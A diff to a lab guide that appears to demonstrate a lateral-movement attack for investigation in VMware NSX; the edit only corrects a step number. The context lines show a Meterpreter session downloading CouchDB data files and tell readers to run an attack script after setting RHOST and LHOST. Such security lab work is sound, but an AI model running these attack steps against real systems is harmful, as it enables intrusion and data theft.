@@ -249,7 +249,7 @@ meterpreter > download /opt/couchdb/data/
 [*] downloading: /opt/couchdb/data//._users_design/mrview/3e823c2a4383ac0c18d4e574135a5b08.view -> /._users_design/mrview/3e823c2a4383ac0c18d4e574135a5b08.view
 ...
 ```
-This completes the lateral movement attack scenario. Now we will go back to NSX manager and investigat this attack. Skip the below step #5 if you have gone through the manaul attack steps above.
+This completes the lateral movement attack scenario. Now we will go back to NSX manager and investigat this attack. Skip the below step #6 if you have gone through the manaul attack steps above.
 
 6. If you prefer not to manually go through this attack scenario, using the above steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, type **sudo nano attack2.rc** and replace the **RHOST** and **LHOST** IP addresses accordingly to match with the IP addresses in your environment. 
     * **RHOST** on line 3 should be the IP address of the App1-WEB-TIER VM 
